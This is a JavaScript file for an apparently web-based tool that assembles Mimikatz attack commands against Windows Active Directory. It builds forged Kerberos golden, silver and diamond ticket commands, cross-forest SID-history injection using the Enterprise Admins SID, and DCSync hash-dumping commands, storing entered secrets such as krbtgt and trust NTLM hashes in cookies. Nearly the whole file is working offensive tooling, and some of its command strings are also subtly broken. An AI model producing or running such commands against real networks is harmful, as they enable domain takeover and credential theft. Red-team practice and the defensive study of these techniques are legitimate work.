// Global
var tool = "mimikatz.exe";

// Prevent Default for all forms
var forms = document.getElementsByTagName("form");
for (var i = 0; i < forms.length; i++) {
	forms[i].addEventListener('submit', function(event) {
		event.preventDefault();
	});
}

// Add event listeners to the tool buttons to set the 'tool' variable based on the selected tool
document.querySelectorAll('#tool-btn').forEach((radioButton) => {
	radioButton.addEventListener('click', function() {
		// Get 'data-tool' value
		tool = this.getAttribute('data-tool').toLowerCase();
	});
});

// Function to generate command based on the active tab
document.querySelectorAll('#generate-command').forEach(function(element) {
	element.addEventListener('click', function(event) {
		event.preventDefault();
		form_id = event.target.parentNode.parentNode.id;
		var command = "";
		var activeTab = document.querySelector('.nav-tabs .active').getAttribute('href'); // Get ID of active tab
		
		if (activeTab === "#nav-cross-forest") {
			command = generateCrossForestCommand();
		} else if (activeTab === "#nav-inter-forest") {
			command = generateInterForestCommand();
		} else if (activeTab === "#nav-kerberor-tickets") {
			command = generateKerberosTicketsCommand(form_id);
		}
		else if (activeTab === "#nav-dump-hashes") {
			command = generateDumpHashesCommand();
		}
	});
});

// Function to generate command for Cross Forest tab
function generateCrossForestCommand() {
	var trustNtlm = document.getElementById("trust-ntlm").value;
	var user = document.getElementById("user").value;
	var currentDomain = document.querySelector("#form-sid-injection #current-domain").value;
	var targetDomain = document.getElementById("target-domain").value;
	var service = document.querySelector("#form-sid-injection #service").value;
	var startoffset = document.querySelector("#form-silver #startoffset").value;
	var endin = document.querySelector("#form-silver #endin").value;
	var renewmax = document.querySelector("#form-silver #renewmax").value;
	var currentDomainSID = document.querySelector("#form-sid-injection #current-sid").value;
	
	flags = `"kerberos::golden /User:${user} /domain:${currentDomain} /sid:${currentDomainSID} /target:${targetDomain} /service:${service} /rc4:${trustNtlm} /startoffset:${startoffset} /endin:${endin} /renewmax:${renewmax} /ptt" "exit"`;

	if (tool == "invoke-mimikatz") {
		command = `Invoke-Mimikatz -Command '${flags}'`;
	} else {
		command = `${tool} ${flags}`;
	}

	document.querySelector("#command-cross-forest").value = command;
}

// Function to generate command for Inter Forest tab
function generateInterForestCommand() {
	var trustNtlm = document.querySelector("#form-sid-injection #trust-ntlm")?.value ?? "";
	var aes = document.querySelector("#form-sid-injection #trust-aes")?.value ?? "";
	var user = document.querySelector("#form-sid-injection #user").value;
	var currentDomain = document.querySelector("#form-sid-injection #current-domain").value;
	var targetDomain = document.querySelector("#form-sid-injection #target-domain").value;
	var currentDomainSID = document.querySelector("#form-sid-injection #current-sid").value;
	var parentDomainSID = document.querySelector("#form-sid-injection #parent-sid").value + "-519"; // Enterprise Admins
	var service = document.querySelector("#form-sid-injection #service").value;
	var ticketPath = document.querySelector("#form-sid-injection #ticket-path").value;
	
	if (aes) {
		flags = `"kerberos::golden /User:${user} /domain:${currentDomain} /sid:${currentDomainSID} /sids:${parentDomainSID} /service:${service} /aes256:${aes} /target:${targetDomain} /ticket:${ticketPath}" "exit"`;
	} else {
		flags = `"kerberos::golden /User:${user} /domain:${currentDomain} /sid:${currentDomainSID} /sids:${parentDomainSID} /service:${service} /rc4:${trustNtlm} /target:${targetDomain} /ticket:${ticketPath}" "exit"`;
	}

	if (tool == "invoke-mimikatz") {
		command = `Invoke-Mimikatz -Command '${flags}'`;
	} else {
		command = `${tool} ${flags}`;
	}
	
	document.querySelector("#command-sid-injection").value = command;	
}

// Function to generate command for Kerberos Tickets tab
function generateKerberosTicketsCommand(form_id) {
	if (form_id == "form-silver") {
		var user = document.querySelector("#form-silver #user").value;
		var targetDomain = document.querySelector("#form-silver #target-domain").value;
		var service = document.querySelector("#form-silver #service").value;
		var rc4 = document.querySelector("#form-silver #rc4").value;
		var aes256 = document.querySelector("#form-silver #aes256").value;
		var startoffset = document.querySelector("#form-silver #startoffset").value;
		var endin = document.querySelector("#form-silver #endin").value;
		var renewmax = document.querySelector("#form-silver #renewmax").value;
		
		flags = `"kerberos::golden /User:${user} /domain:${targetDomain} /service:${service} /rc4:${rc4} /aes256:${aes256} /startoffset:${startoffset} /endin:${endin} /renewmax:${renewmax} /ptt" "exit"`;

		if (tool == "invoke-mimikatz") {
			command = `Invoke-Mimikatz -Command '${flags}'`;
		} else {
			command = `${tool} ${flags}`;
		}
		document.querySelector("#command-silver").value = command;
		
	} else if (form_id == "form-golden") {
		var user = document.querySelector("#form-golden #user").value;
		var targetDomain = document.querySelector("#form-golden #current-domain").value;
		var rc4 = document.querySelector("#form-golden #rc4")?.value ?? "";
		var aes256 = document.querySelector("#form-golden #aes256")?.value ?? "";
		var startoffset = document.querySelector("#form-golden #startoffset").value;
		var endin = document.querySelector("#form-golden #endin").value;
		var renewmax = document.querySelector("#form-golden #renewmax").value;
		
		flags = `"kerberos::golden /User:${user} /domain:${targetDomain} /rc4:${rc4} /aes256:${aes256} /startoffset:${startoffset} /endin:${endin} /renewmax:${renewmax} /ptt" "exit"`;

		if (tool == "invoke-mimikatz") {
			command = `Invoke-Mimikatz -Command '${flags}'`;
		} else {
			command = `${tool} ${flags}`;
		}
		
		document.querySelector("#command-golden").value = command;
	} else {
		var user = document.querySelector("#form-diamond #user").value;
		var targetDomain = document.querySelector("#form-diamond #target-domain").value;
		var service = document.querySelector("#form-diamond #service").value;
		var rc4 = document.querySelector("#form-diamond #rc4").value;
		var aes256 = document.querySelector("#form-diamond #aes256").value;
		var startoffset = document.querySelector("#form-diamond #startoffset").value;
		var endin = document.querySelector("#form-diamond #endin").value;
		var renewmax = document.querySelector("#form-diamond #renewmax").value;
		
		flags = `"kerberos::golden /User:${user} /domain:${targetDomain} /service:${service} /rc4:${rc4} /aes256:${aes256} /startoffset:${startoffset} /endin:${endin} /renewmax:${renewmax} /ptt" "exit"`;

		if (tool == "invoke-mimikatz") {
			command = `Invoke-Mimikatz -Command '${flags}'`;
		} else {
			command = `${tool} ${flags}`;
		}

		document.querySelector("#command-diamond").value = command;
		
	}
}

// Funtion to generateDumpHashesCommand
// Invoke-Mimi -Command '"lsadump::lsa /patch"'
function generateDumpHashesCommand() {
	var user = document.querySelector("#form-dc-sync #user").value;
	var netbios = document.querySelector("#form-dc-sync #netbios").value;

	var command = `${tool} "lsadump::golden /user:${netbios}\\${user}" "exit"`;

	if (tool == "invoke-mimikatz") {
		var command = `${tool} -Command "lsadump::dcsync /user:${netbios}\\${user}" "exit"`;
	}

	document.querySelector("#command-dump-hashes").value = command;
}

// Function to set cookies
function setCookie(name, value, days) {
	var expires = "";
	if (days) {
		var date = new Date();
		date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
		expires = "; expires=" + date.toUTCString();
	}
	document.cookie = name + "=" + (value || "") + expires + "; path=/";
}

// Function to get cookies
function getCookie(name) {
	var nameEQ = name + "=";
	var ca = document.cookie.split(';');
	for (var i = 0; i < ca.length; i++) {
		var c = ca[i];
		while (c.charAt(0) === ' ') c = c.substring(1, c.length);
		if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
	}
	return null;
}

// Function to update cookie value and form input value
function updateCookieAndInput(event) {
	var input = event.target;
	setCookie(input.id, input.value, 30);
}

// Function to fill form inputs with cookie values
function fillFormInputs() {
	document.getElementById('parent-domain').value = getCookie('parent-domain') || '';
	document.getElementById('current-domain').value = getCookie('current-domain') || '';
	document.getElementById('current-sid').value = getCookie('current-sid') || '';
	document.getElementById('parent-sid').value = getCookie('parent-sid') || '';
	document.getElementById('krbtgt').value = getCookie('krbtgt') || '';
	document.getElementById('user').value = getCookie('user') || '';
	document.getElementById('trust-ntlm').value = getCookie('trust-ntlm') || '';
	document.getElementById('target-domain').value = getCookie('target-domain') || '';
}

// Clipboard
function copyToClipboard() {
	var commandInput = document.getElementById('command');
	commandInput.select();
	document.execCommand('copy');
}

// Call fillFormInputs function when the page loads
window.onload = fillFormInputs;

// Add event listeners to form inputs to update cookies and form inputs when the user types
var formInputs = document.querySelectorAll('.form-control');
formInputs.forEach(function(input) {
	input.addEventListener('input', updateCookieAndInput);
});